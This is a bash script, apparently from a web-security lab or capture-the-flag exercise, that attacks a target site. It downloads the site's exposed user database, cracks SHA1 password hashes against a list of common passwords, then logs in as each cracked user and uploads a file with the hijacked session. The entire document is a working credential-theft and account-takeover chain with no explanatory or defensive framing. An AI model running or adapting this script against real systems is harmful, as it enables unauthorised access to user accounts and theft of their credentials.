#!/bin/bash

POST_URL="${1}/post.php"
UPLOAD_URL="${1}/upload.php"

if [ ! -f hashes.txt ]; then
    echo "Computing sha1 hashes for 1000 most common passwords"
    while read -r line; do
        hash=`php -r "echo sha1('${line}');"`
        echo "${hash} ${line}" >> hashes.txt;
    done < common_passwords.txt
fi

if [ ! -f data.db ]; then
    echo "Fetching database file"
    wget --quiet "$1/docs/data.db"
fi

SQL="SELECT username, password FROM users WHERE username <> 'alice';" # We don't care about alice, since we already have her password

echo $SQL | sqlite3 data.db | while read line; do
    credentials=(${line//|/ })
    username="${credentials[0]}"
    hashed_password="${credentials[1]}"
    password=`grep $hashed_password hashes.txt | cut -d\   -f2` 

   if [ ! -z $password ]; then
       echo "Found match! ${username} : ${password}"

       echo "Attempting to log in as $username:$password"
       echo "form=login&submit=Login&username=${username}&password=${password}" | curl -d @- -c cookies ${POST_URL}
       curl -L -b cookies -s ${1} | awk '/Welcome, ([a-z]+)!/ { print $1 " " $2 }' 

       echo "Attempting to upload an image..."
       curl -L -b cookies -H "Content-Type: multipart/form-data" -F "submit=Upload+Image" -F "fileToUpload=@image.jpg" -s ${UPLOAD_URL} > /dev/null

       echo ""
   fi
done

rm cookies
